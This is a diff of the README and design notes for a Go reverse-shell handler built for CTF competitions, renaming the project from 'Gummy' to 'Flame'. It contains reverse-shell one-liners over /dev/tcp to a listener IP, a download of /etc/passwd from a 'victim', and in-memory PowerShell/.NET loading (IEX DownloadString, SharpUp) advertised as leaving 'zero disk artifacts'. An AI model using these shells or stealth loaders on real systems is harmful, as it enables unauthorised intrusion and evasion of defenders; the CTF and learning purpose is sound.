@@ -1,8 +1,8 @@
-# Gummy - Advanced Shell Handler for CTFs
+# Flame - Advanced Shell Handler for CTFs
 
 ## Project Overview
 
-Gummy is a modern shell handler written in Go, designed for CTF competitions. It's a port/reimplementation of [Penelope](https://github.com/brightio/penelope) with enhanced features and a beautiful CLI interface using Bubble Tea components.
+Flame is a modern shell handler written in Go, designed for CTF competitions. It's a port/reimplementation of [Penelope](https://github.com/brightio/penelope) with enhanced features and a beautiful CLI interface using Bubble Tea components.
 
 **Primary Goals:**
 - Learn Go by building a practical tool
@@ -15,26 +15,26 @@ Gummy is a modern shell handler written in Go, designed for CTF competitions. It
 ### Installation
 ```bash
 # Clone repository
-git clone https://github.com/chsoares/gummy.git
-cd gummy
+git clone https://github.com/chsoares/flame.git
+cd flame
 
 # Build binary
-go build -o gummy
+go build -o flame
 
 # Run with interface binding (recommended)
-./gummy -i eth0 -p 4444
+./flame -i eth0 -p 4444
 
 # Or with direct IP
-./gummy -ip 10.10.14.5 -p 4444
+./flame -ip 10.10.14.5 -p 4444
 ```
 
 ### Basic Workflow
 ```bash
 # 1. Start listener
-./gummy -i tun0 -p 4444
+./flame -i tun0 -p 4444
 
-# 2. Generate payload (in gummy menu)
-󰗣 gummy ❯ rev
+# 2. Generate payload (in flame menu)
+󰗣 flame ❯ rev
 # Copy one of the generated payloads
 
 # 3. Execute on victim machine
@@ -44,16 +44,16 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
  Reverse shell received on session 1 (10.10.11.123)
 
 # 5. Use the session
-󰗣 gummy ❯ use 1
+󰗣 flame ❯ use 1
  Using session 1 (10.10.11.123)
 
 # 6. Enter interactive shell
-󰗣 gummy [1] ❯ shell
+󰗣 flame [1] ❯ shell
  Entering interactive shell
 # PTY upgrade happens automatically!
 
 # 7. Or upload/download files
-󰗣 gummy [1] ❯ upload linpeas.sh /tmp/linpeas.sh
+󰗣 flame [1] ❯ upload linpeas.sh /tmp/linpeas.sh
 ⠋ Uploading linpeas.sh... 100%
  Upload complete! (MD5: 8b1a9953)
 ```
@@ -87,7 +87,7 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
 - [x] **Readline Integration** (`github.com/chzyer/readline`)
   - Arrow keys for cursor movement in menu
   - Up/Down for command history navigation
-  - Persistent history in `~/.gummy/history` (1000 commands)
+  - Persistent history in `~/.flame/history` (1000 commands)
   - Standard keybinds (Ctrl+A/E, Ctrl+W, etc.)
   - Smart tab completion for commands and local file paths
 - [x] **Animated Spinners** (`internal/ui/spinner.go`)
@@ -163,7 +163,7 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Automatic cleanup with shred (secure deletion)
   - Module table shows execution mode symbols with legend
 - [x] **Session Directories** 🆕
-  - Format: `~/.gummy/YYYY_MM_DD/IP_user_hostname/` (shared per host)
+  - Format: `~/.flame/YYYY_MM_DD/IP_user_hostname/` (shared per host)
   - Lazy creation (only when needed by modules)
   - Auto-created `scripts/` and `logs/` subdirectories
   - Path sanitization for special characters
@@ -178,7 +178,7 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Falls back to traditional terminals
   - Auto-detects available terminal emulator
 - [x] **Configuration System** (`internal/config.go`, `internal/runtime_config.go`) 🔥
-  - TOML-based persistent configuration (`~/.gummy/config.toml`)
+  - TOML-based persistent configuration (`~/.flame/config.toml`)
   - Runtime-mutable settings with thread-safe access (sync.RWMutex)
   - **Binbag integration** - Serve files via HTTP for blazing fast uploads
   - **Execution mode** - Toggle between "stealth" (in-memory) and "speed" (HTTP)
@@ -189,14 +189,14 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Lightweight HTTP server serving files from binbag directory
   - Real-time progress tracking with channel-based notifications
   - Inactivity timeout (resets on progress, prevents false timeouts)
-  - Automatic cleanup on gummy exit
+  - Automatic cleanup on flame exit
   - Format: `http://<listener-ip>:<http-port>/filename`
 - [x] **Windows PowerShell Support** (`internal/shell.go`) 🆕
   - Dual-mode shell handler: PTY mode (raw) for Linux, readline mode for Windows
   - Readline loop using `github.com/peterh/liner` library
   - Full line editing support (left/right arrows, Ctrl-A/E/K/W)
-  - Local command history (up/down arrows) persisted to `~/.gummy/shell_history`
-  - Ctrl-C sends `^C` to remote shell without killing gummy
+  - Local command history (up/down arrows) persisted to `~/.flame/shell_history`
+  - Ctrl-C sends `^C` to remote shell without killing flame
   - Ctrl-D to exit back to menu
   - Platform auto-detection based on prompt patterns (`PS C:\` for Windows)
   - Known limitation: Prompt may briefly disappear when navigating history
@@ -214,7 +214,7 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
 - [x] **PowerShell in-memory via HTTP** - `IEX DownloadString` - single HTTP request, zero disk
 - [x] **Fix Windows whoami detection** - Two-phase detection: platform from prompt → platform-specific commands
 - [x] **SIGWINCH handler** - Dynamic terminal resize when user resizes window
-- [x] **Session Logging** - Automatic I/O logging to `~/.gummy/YYYY_MM_DD/IP_user_hostname/logs/session_N.log`
+- [x] **Session Logging** - Automatic I/O logging to `~/.flame/YYYY_MM_DD/IP_user_hostname/logs/session_N.log`
 
 **Remaining Polish & Testing**
 - [ ] **Test Windows in-memory modules** - `run ps1`, `run net`, `run py` need testing with HTTP mode
@@ -226,7 +226,7 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
 ## Project Structure
 
 ```
-gummy/
+flame/
 ├── main.go                      # ✅ Entry point, CLI flags, binbag initialization
 ├── internal/
 │   ├── listener.go              # ✅ TCP listener, connection acceptance
@@ -255,7 +255,7 @@ gummy/
 - **Flat `internal/` package** - All core modules in single package, no nested folders
 - **Single binary** - `main.go` at root (removed unnecessary `cmd/` directory)
 - **UI separation** - `ui/` sub-package for clear separation of presentation layer
-- **Easy imports** - `import "github.com/chsoares/gummy/internal"` for everything
+- **Easy imports** - `import "github.com/chsoares/flame/internal"` for everything
 - **Simple navigation** - All files visible at once, no hunting through subdirectories
 - **Pragmatic** - Less boilerplate, more focus on actual code
 
@@ -332,13 +332,13 @@ Will be used for:
 **Build & Run:**
 ```fish
 # Development
-go run ./cmd/gummy -p 4444
+go run ./cmd/flame -p 4444
 
 # Build binary
-go build -o gummy
+go build -o flame
 
 # Run binary
-./gummy -p 4444 -h 0.0.0.0
+./flame -p 4444 -h 0.0.0.0
 ```
 
 **Testing Connection:**
@@ -352,28 +352,28 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
 
 **Using File Transfer:**
 ```fish
-# Start gummy
-./gummy -p 4444
+# Start flame
+./flame -p 4444
 
 # In another terminal, connect reverse shell
 bash -i >& /dev/tcp/localhost/4444 0>&1
 
-# In gummy:
-󰗣 gummy ❯ list
+# In flame:
+󰗣 flame ❯ list
 Active sessions:
   1 → 127.0.0.1:xxxxx
 
-󰗣 gummy ❯ use 1
+󰗣 flame ❯ use 1
  Selected session 1
 
 # Upload file to victim
-󰗣 gummy ❯ upload /tmp/test.txt /tmp/uploaded.txt
+󰗣 flame ❯ upload /tmp/test.txt /tmp/uploaded.txt
  Uploading test.txt (42 B)...
  [████████████████████████████████████████] 100% (1/1 chunks)
 ✅ Upload complete! (MD5: 5d41402a)
 
 # Download file from victim
-󰗣 gummy ❯ download /etc/passwd
+󰗣 flame ❯ download /etc/passwd
  Downloading passwd...
  Downloaded 2.1 KB
 ✅ Download complete! Saved to: passwd (MD5: 8b1a9953)
@@ -464,7 +464,7 @@ Blue           - Commands, help text, table headers
 Consistent symbols create visual hierarchy:
 
 ```go
-󰗣 (SymbolDroplet)  - Main gummy branding (prompt, banner)
+󰗣 (SymbolDroplet)  - Main flame branding (prompt, banner)
  (SymbolFire)     - New reverse shell received (exciting!)
  (SymbolGem)      - Active sessions header
  (SymbolSkull)    - Session closed/died
@@ -499,11 +499,11 @@ ui.SessionClosed(1, "192.168.1.100")    //  Red skull + session info
 ui.UsingSession(1, "192.168.1.100")     //  Yellow target + session info
 
 // Prompts
-ui.Prompt()                              // 󰗣 gummy ❯
-ui.PromptWithSession(sessionID)          // 󰗣 gummy [1] ❯
+ui.Prompt()                              // 󰗣 flame ❯
+ui.PromptWithSession(sessionID)          // 󰗣 flame [1] ❯
 
 // Styled boxes
-ui.Banner()                              // Rounded box with "gummy shell 󰗣"
+ui.Banner()                              // Rounded box with "flame shell 󰗣"
 ui.BoxWithTitle(title, lines)            // Generic box with title
 ui.BoxWithTitlePadded(title, lines, pad) // Box with custom padding
 ```
@@ -658,8 +658,8 @@ if err != nil {
 
 ### Manual Testing
 ```fish
-# Start gummy
-go run ./cmd/gummy -p 4444
+# Start flame
+go run ./cmd/flame -p 4444
 
 # Connect with netcat
 nc localhost 4444
@@ -721,7 +721,7 @@ $args = @("audit")
 $assembly.EntryPoint.Invoke($null, @(,$args))
 ```
 
-### Implementation in Gummy
+### Implementation in Flame
 ```go
 // internal/session.go - RunDotNetInMemory()
 func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource string, args []string) error {
@@ -753,16 +753,16 @@ $assembly.EntryPoint.Invoke($null, @(,%s))
 }
 ```
 
-### Usage in Gummy
+### Usage in Flame
 ```bash
 # 1. Enable binbag
-󰗣 gummy ❯ set binbag ~/Lab/binbag
+󰗣 flame ❯ set binbag ~/Lab/binbag
 
 # 2. Add SharpUp.exe to binbag directory
 cp SharpUp.exe ~/Lab/binbag/
 
 # 3. Run in-memory (current `run net` module)
-󰗣 gummy [1] ❯ run net SharpUp.exe audit
+󰗣 flame [1] ❯ run net SharpUp.exe audit
 
 # Output streams to new terminal window
 # Zero disk artifacts on victim!
@@ -794,11 +794,11 @@ cp SharpUp.exe ~/Lab/binbag/
 Use `run bin` module (disk + cleanup):
 ```bash
 # Run native binary (writes to disk temporarily)
-󰗣 gummy [1] ❯ run bin pspy64
+󰗣 flame [1] ❯ run bin pspy64
 
 # Execution:
 # 1. Download from binbag via HTTP
-# 2. Write to /tmp/gummy_pspy64
+# 2. Write to /tmp/flame_pspy64
 # 3. chmod +x
 # 4. Execute
 # 5. Shred file on completion
@@ -983,7 +983,7 @@ run sh <url> [args]          - Run arbitrary shell script from URL (💾)
 # Utility
 help                         - Show command reference
 clear                        - Clear screen
-exit, quit                   - Exit gummy (with confirmation)
+exit, quit                   - Exit flame (with confirmation)
 ```
 
 ### Known Limitations
